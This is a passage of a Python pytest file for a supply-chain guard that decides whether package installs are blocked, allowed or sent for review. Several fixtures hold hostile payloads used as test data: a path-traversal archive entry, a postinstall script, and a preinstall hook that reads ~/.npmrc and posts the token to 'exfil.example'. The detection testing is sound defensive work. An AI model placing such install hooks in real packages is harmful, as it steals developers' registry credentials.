            "https://hol.org/guard/supply-chain/evaluate",
            status_code,
            "cloud evaluation failed",
            {},
            None,
        )

    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", raise_http_error)
    artifact = _artifact_for_targets("left-pad@1.0.0")
    workspace_dir = tmp_path / "workspace"
    result = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    expected_code = "cloud_auth_error" if status_code in {401, 403} else "cloud_validation_error"
    assert any(reason["code"] == expected_code for reason in result.reasons)
    if status_code in {401, 403}:
        assert result.decision == "monitor"
        assert result.policy_action == "allow"
        assert result.enforcement == "offline_cached"
    else:
        assert result.decision == "ask"
        assert result.policy_action == "require-reapproval"
        assert result.enforcement == "premium_cloud"


def test_evaluate_package_request_artifact_strict_mode_blocks_on_cloud_unreachable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    (store.guard_home / "config.toml").write_text('security_level = "strict"\n', encoding="utf-8")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    def raise_timeout(*args: object, **kwargs: object) -> object:
        raise TimeoutError("network unreachable")

    artifact = _artifact_for_targets("left-pad@1.0.0")
    workspace_dir = tmp_path / "workspace"
    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", raise_timeout)
    result = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "premium_cloud"
    assert any(reason["code"] == "cloud_validation_error" for reason in result.reasons)
    cached = store.get_cached_supply_chain_evaluation(
        workspace_id=WORKSPACE_ID,
        package_intent_hash=result.package_intent_hash,
        feed_snapshot_hash="feed-snapshot-1",
        policy_hash="policy-hash-1",
        scoring_version="scf-v1",
        bundle_version="1747612800000-deadbeef",
    )
    assert isinstance(cached, dict)

    monkeypatch.setattr(
        evaluator_module,
        "_urlopen_json_with_timeout_retry",
        lambda *args, **kwargs: _cloud_response(
            decision="monitor",
            enforcement="premium_cloud",
            entitlement_state="premium",
            package_name="left-pad",
        ),
    )
    retried = evaluate_package_request_artifact(
        artifact=artifact,
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:05:00Z",
    )

    assert retried.decision == "monitor"
    assert not any(reason["code"] == "cloud_validation_error" for reason in retried.reasons)


def test_evaluate_package_request_artifact_rejects_untrusted_cloud_endpoint_before_network(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(
        store,
        workspace_id=WORKSPACE_ID,
        sync_url="https://evil.example/api/guard/receipts/sync",
        token="demo-token",
    )
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    def fail_network(*args: object, **kwargs: object) -> object:
        raise AssertionError("untrusted supply-chain endpoint reached network")

    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", fail_network)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"
    assert result.enforcement == "premium_cloud"
    assert any(reason["code"] == "cloud_validation_error" for reason in result.reasons)


def test_evaluate_external_tarball_requires_approval_without_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def fail_scan(_source_url: str) -> object:
        raise AssertionError("external archive inspection ran before approval")

    def fail_cloud(*_args: object, **_kwargs: object) -> object:
        raise AssertionError("external archive evaluation reached cloud network before approval")

    monkeypatch.setattr(evaluator_module, "_scan_external_tarball", fail_scan)
    monkeypatch.setattr(evaluator_module, "_evaluate_with_cloud", fail_cloud)

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("https://packages.example.com/review-first.tgz"),
        store=GuardStore(tmp_path / "guard-home"),
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "review"
    assert any(reason["code"] == "external_tarball_source" for reason in result.reasons)


def test_evaluate_package_request_artifact_blocks_external_tarball_zip_slip(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive = _tarball_bytes([("../escape.sh", b"#!/bin/sh\necho pwned\n")])
    downloaded = _downloaded_archive(tmp_path, archive)
    monkeypatch.setattr(evaluator_module, "_download_external_tarball", lambda *_args, **_kwargs: downloaded)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("https://packages.example.com/unsafe.tgz"),
        store=GuardStore(tmp_path / "guard-home"),
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
        external_archive_network_authorized=True,
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert any(reason["code"] == "tarball_zip_slip" for reason in result.reasons)


def test_evaluate_package_request_artifact_blocks_external_tarball_install_scripts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    marker_path = tmp_path / "postinstall-marker.txt"
    package_json = json.dumps(
        {
            "name": "unsafe-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": (
                    'python -c "from pathlib import Path; '
                    f"Path(r'{marker_path}').write_text('pwned', encoding='utf-8')\""
                )
            },
        }
    ).encode("utf-8")
    archive = _tarball_bytes([("package/package.json", package_json)])
    downloaded = _downloaded_archive(tmp_path, archive)
    monkeypatch.setattr(evaluator_module, "_download_external_tarball", lambda *_args, **_kwargs: downloaded)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("https://packages.example.com/scripted.tgz"),
        store=GuardStore(tmp_path / "guard-home"),
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
        external_archive_network_authorized=True,
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert any(reason["code"] == "tarball_install_script" for reason in result.reasons)
    assert marker_path.exists() is False


def test_evaluate_package_request_artifact_blocks_shai_hulud_style_credential_theft_tarball_fixture(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    package_json = json.dumps(
        {
            "name": "shai-hulud-fixture",
            "version": "1.0.0",
            "scripts": {
                "preinstall": (
                    "node -e \"const fs=require('fs'); const https=require('https'); "
                    "const token=fs.readFileSync(process.env.HOME + '/.npmrc','utf8'); "
                    "const req=https.request({hostname:'exfil.example',method:'POST'}); "
                    'req.end(token);"'
                )
            },
        }
    ).encode("utf-8")
    archive = _tarball_bytes([("package/package.json", package_json)])
    downloaded = _downloaded_archive(tmp_path, archive)
    monkeypatch.setattr(evaluator_module, "_download_external_tarball", lambda *_args, **_kwargs: downloaded)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("https://packages.example.com/shai-hulud-fixture.tgz"),
        store=GuardStore(tmp_path / "guard-home"),
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
        external_archive_network_authorized=True,
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert any(reason["code"] == "credential_theft_install_script" for reason in result.reasons)


def test_evaluate_package_request_artifact_reviews_clean_external_tarball(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    package_json = json.dumps({"name": "safe-package", "version": "1.0.0"}).encode("utf-8")
    archive = _tarball_bytes([("package/package.json", package_json)])
    downloaded = _downloaded_archive(tmp_path, archive)
    monkeypatch.setattr(evaluator_module, "_download_external_tarball", lambda *_args, **_kwargs: downloaded)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("https://packages.example.com/safe.tgz"),
        store=GuardStore(tmp_path / "guard-home"),
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
        external_archive_network_authorized=True,
    )

    assert result.decision == "ask"
    assert result.policy_action == "review"
    assert any(reason["code"] == "external_tarball_source" for reason in result.reasons)


def test_evaluate_package_request_artifact_fails_closed_on_invalid_cloud_response(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    def raise_invalid_response(*args: object, **kwargs: object) -> object:
        raise ValueError("not json")

    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", raise_invalid_response)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"
    assert result.enforcement == "premium_cloud"
    assert any(reason["code"] == "cloud_validation_error" for reason in result.reasons)


def test_evaluate_package_request_artifact_ignores_malformed_cached_bundle(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    monkeypatch.setattr(
        store,
        "get_cached_supply_chain_bundle",
        lambda workspace_id: {"bundle": "corrupted"},
    )
    monkeypatch.setattr(
        evaluator_module,
        "_urlopen_json_with_timeout_retry",
        lambda *args, **kwargs: _cloud_response(
            decision="monitor",
            enforcement="premium_cloud",
            entitlement_state="active",
            package_name="left-pad",
        ),
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.policy_action == "allow"
    assert result.enforcement == "premium_cloud"


def test_evaluate_package_request_artifact_normalizes_cloud_review_decision(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)

    monkeypatch.setattr(
        evaluator_module,
        "_urlopen_json_with_timeout_retry",
        lambda **_: {
            "cacheStatus": "miss",
            "decision": "review",
            "enforcement": "premium_cloud",
            "entitlementState": "premium",
            "packages": [
                {
                    "decision": "review",
                    "ecosystem": "npm",
                    "name": "minimist",
                    "namespace": None,
                    "requestedVersion": "1.2.8",
                    "resolvedVersion": "1.2.8",
                    "recommendedFixVersion": "1.2.9",
                    "riskScore": 980,
                    "reasons": [
                        {
                            "code": "known_advisory",
                            "message": "Prototype pollution in minimist",
                            "severity": "critical",
                            "source": "ghsa",
                        }
                    ],
                }
            ],
            "policyVersion": "policy-version-1",
            "reasons": [
                {
                    "code": "known_advisory",
                    "message": "Prototype pollution in minimist",
                    "severity": "critical",
                    "source": "ghsa",
                }
            ],
        },
    )
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"


def test_evaluate_package_request_artifact_applies_policy_rule_override(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ],
        policy_rules=[
            {
                "action": "warn",
                "ruleId": "policy-rule-1",
                "ecosystemSelector": "npm",
                "enabled": True,
                "expiresAt": "2099-01-01T00:00:00Z",
                "harnessSelector": "codex",
                "packageSelector": "minimist",
                "priority": 1,
                "severityThreshold": "low",
                "versionRangeSelector": "1.2.8",
            }
        ],
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "warn"
    assert result.policy_action == "warn"
    assert result.enforcement == "policy_override"
    assert result.matched_rule_id == "policy-rule-1"


@pytest.mark.parametrize("harness_selector", [None, "*"])
def test_evaluate_package_request_artifact_policy_rule_matches_unset_or_wildcard_harness(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    harness_selector: str | None,
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ],
        policy_rules=[
            {
                "action": "warn",
                "ruleId": "all-harnesses-policy-rule",
                "ecosystemSelector": "npm",
                "enabled": True,
                "expiresAt": "2099-01-01T00:00:00Z",
                "harnessSelector": harness_selector,
                "packageSelector": "minimist",
                "priority": 1,
                "severityThreshold": "low",
                "versionRangeSelector": "1.2.8",
            }
        ],
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8", harness="gemini"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "warn"
    assert result.policy_action == "warn"
    assert result.enforcement == "policy_override"
    assert result.matched_rule_id == "all-harnesses-policy-rule"


def test_evaluate_package_request_artifact_policy_rule_rejects_different_harness(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ],
        policy_rules=[
            {
                "action": "warn",
                "ruleId": "codex-only-policy-rule",
                "ecosystemSelector": "npm",
                "enabled": True,
                "expiresAt": "2099-01-01T00:00:00Z",
                "harnessSelector": "codex",
                "packageSelector": "minimist",
                "priority": 1,
                "severityThreshold": "low",
                "versionRangeSelector": "1.2.8",
            }
        ],
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8", harness="gemini"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "offline_cached"
    assert result.matched_rule_id is None


def test_evaluate_package_request_artifact_respects_policy_severity_threshold(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ],
        policy_rules=[
            {
                "action": "allow",
                "ruleId": "allow-high-only",
                "ecosystemSelector": "npm",
                "enabled": True,
                "expiresAt": "2099-01-01T00:00:00Z",
                "harnessSelector": "codex",
                "packageSelector": "left-pad",
                "priority": 1,
                "severityThreshold": "high",
                "versionRangeSelector": "1.0.0",
            }
        ],
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.matched_rule_id is None
    assert result.enforcement == "offline_cached"


def test_evaluate_package_request_artifact_keeps_policy_metadata_on_winning_package(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            ),
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            ),
        ],
        policy_rules=[
            {
                "action": "allow",
                "ruleId": "allow-left-pad",
                "ecosystemSelector": "npm",
                "enabled": True,
                "expiresAt": "2099-01-01T00:00:00Z",
                "harnessSelector": "codex",
                "packageSelector": "left-pad",
                "priority": 1,
                "severityThreshold": None,
                "versionRangeSelector": "1.0.0",
            }
        ],
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8", "left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.matched_rule_id is None
    assert result.exception_id is None
    assert result.enforcement == "offline_cached"


def test_evaluate_package_request_artifact_applies_allow_exception_rule(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ],
        policy_rules=[
            {
                "action": "allow",
                "ruleId": "guard-exception-123",
                "ecosystemSelector": "npm",
                "enabled": True,
                "expiresAt": "2099-01-01T00:00:00Z",
                "harnessSelector": "codex",
                "packageSelector": "minimist",
                "priority": 1,
                "severityThreshold": None,
                "versionRangeSelector": "1.2.8",
            }
        ],
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "allow"
    assert result.policy_action == "allow"
    assert result.exception_id == "guard-exception-123"


def test_evaluate_package_request_artifact_summarizes_multi_package_and_safe_alternatives(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
                risk_score=980,
            ),
            _package(
                ecosystem="npm",
                name="lodash",
                version="4.17.20",
                default_action="warn",
                normalized_severity="high",
                exploit_level="elevated",
                known_exploited=False,
                malware_state="none",
                recommended_fix_version="4.17.21",
                risk_score=720,
            ),
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8", "lodash@4.17.20"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert len(result.packages) == 2
    assert "lodash" in result.user_copy.summary.lower()
    assert "1.2.9" in (result.user_copy.next_step or "")


def test_evaluate_package_request_artifact_blocks_maintainer_compromise_fixture(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="trusted-build-tools",
                version="5.4.0",
                default_action="block",
                exploit_level="elevated",
                known_exploited=False,
                malware_state="suspected",
                normalized_severity="high",
                recommended_fix_version=None,
                risk_score=930,
                source_integrity_state="high-risk",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("trusted-build-tools@5.4.0"),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert any(reason["code"] == "maintainer_compromise" for reason in result.reasons)


def test_evaluate_package_request_artifact_blocks_transitive_lockfile_match_with_dependency_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    (workspace_dir / "package-lock.json").write_text(
        json.dumps(
            {
                "packages": {
                    "": {"name": "react-app"},
                    "node_modules/react": {"version": "18.0.0"},
                    "node_modules/react/node_modules/minimist": {"version": "1.2.8"},
                }
            }
        ),
        encoding="utf-8",
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    transitive_match = next(package for package in result.packages if package["name"] == "minimist")
    assert transitive_match["dependencyPath"] == "react/node_modules/minimist"
    assert transitive_match["direct"] is False
    assert any("react/node_modules/minimist" in reason["message"] for reason in result.reasons)


def test_evaluate_package_request_artifact_warns_for_low_confidence_transitive_lockfile_match(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="debug",
                version="4.3.4",
                default_action="block",
                confidence=650,
                normalized_severity="high",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                recommended_fix_version="4.3.5",
                risk_score=610,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    (workspace_dir / "package-lock.json").write_text(
        json.dumps(
            {
                "packages": {
                    "": {"name": "demo-app"},
                    "node_modules/react": {"version": "18.0.0"},
                    "node_modules/react/node_modules/debug": {"version": "4.3.4"},
                }
            }
        ),
        encoding="utf-8",
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "warn"
    transitive_match = next(package for package in result.packages if package["name"] == "debug")
    assert transitive_match["decision"] == "warn"
    assert transitive_match["dependencyPath"] == "react/node_modules/debug"
    assert "react/node_modules/debug" in result.user_copy.harness_message


def test_transitive_lockfile_resolution_uses_bounded_deadline(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    (workspace_dir / "package-lock.json").write_text(
        json.dumps(
            {
                "packages": {
                    "": {"name": "demo-app"},
                    "node_modules/react/node_modules/minimist": {"version": "1.2.8"},
                }
            }
        ),
        encoding="utf-8",
    )
    captured: dict[str, float] = {}

    def fake_package_lock_entries(
        lockfile_text: str, *, deadline: float | None = None
    ) -> list[tuple[str, str, str, bool]]:
        captured["deadline"] = deadline
        assert "minimist" in lockfile_text
        return [("react/node_modules/minimist", "minimist", "1.2.8", False)]

    monkeypatch.setattr(evaluator_module.time, "monotonic", lambda: 100.0)
    monkeypatch.setattr(evaluator_module, "_package_lock_entries", fake_package_lock_entries)

    evaluate_package_request_artifact(
        artifact=_artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert captured["deadline"] == pytest.approx(100.2)


def test_transitive_lockfile_timeout_pauses_without_using_partial_entries(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    (workspace_dir / "package-lock.json").write_text(
        json.dumps(
            {
                "packages": {
                    "": {"name": "demo-app"},
                    "node_modules/react/node_modules/minimist": {"version": "1.2.8"},
                }
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        evaluator_module,
        "_package_lock_entries",
        lambda _text, *, deadline=None: (_ for _ in ()).throw(_DeadlineExceededError("deadline_exceeded")),
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"
    assert any(reason["code"] == "lockfile_parse_incomplete" for reason in result.reasons)
    assert result.packages[0]["lockfileParseError"] == "deadline_exceeded"
    assert result.packages[0]["lockfileParseComplete"] is False
    assert result.packages[0]["lockfileParserVersion"] == "complete-v1"
    assert "npm-package-lock" in result.user_copy.harness_message


def test_package_from_cloud_result_preserves_direct_and_dependency_path_schema() -> None:
    transitive_item = evaluator_module._package_from_cloud_result(
        {
            "decision": "block",
            "ecosystem": "npm",
            "name": "minimist",
            "namespace": None,
            "requestedVersion": "^1.2.0",
            "resolvedVersion": "1.2.8",
            "recommendedFixVersion": "1.2.9",
            "riskScore": 980,
            "dependencyPath": "react/node_modules/minimist",
            "direct": False,
            "reasons": [{"code": "known_advisory", "message": "Prototype pollution", "severity": "critical"}],
        }
    )
    direct_item = evaluator_module._package_from_cloud_result(
        {
            "decision": "allow",
            "ecosystem": "npm",
            "name": "react",
            "requestedVersion": "18.0.0",
            "resolvedVersion": "18.0.0",
            "reasons": [],
        }
    )

    assert transitive_item["dependencyPath"] == "react/node_modules/minimist"
    assert transitive_item["direct"] is False
    assert direct_item["dependencyPath"] is None
    assert direct_item["direct"] is True


def test_resolved_target_version_uses_registry_metadata_for_npm_ranges(monkeypatch: pytest.MonkeyPatch) -> None:
    captured: dict[str, str] = {}

    def fake_urlopen_json_with_timeout_retry(
        *, request: urllib.request.Request, timeout_seconds: int, retry_timeout_seconds: int
    ) -> dict[str, object]:
        captured["url"] = request.full_url
        assert timeout_seconds == 1
        assert retry_timeout_seconds == 1
        return {
            "versions": {
                "1.1.9": {},
                "1.2.0": {},
                "1.4.2": {},
                "2.0.0": {},
            }
        }

    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", fake_urlopen_json_with_timeout_retry)
    resolved = evaluator_module._resolved_target_version(
        target={
            "ecosystem": "npm",
            "name": "minimist",
            "normalized_name": "minimist",
            "namespace": None,
            "range": "^1.2.0",
            "version": None,
            "source_url": None,
        },
        lockfile_versions={},
    )

    assert captured["url"].endswith("/minimist")
    assert resolved == "1.4.2"


def test_evaluate_package_request_artifact_requires_review_for_malformed_registry_metadata(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(
        evaluator_module,
        "_urlopen_json_with_timeout_retry",
        lambda **_kwargs: {"versions": ["1.0.0"]},
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("private-demo@^1.0.0"),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"
    assert any(reason["code"] == "unidentified_package" for reason in result.reasons)


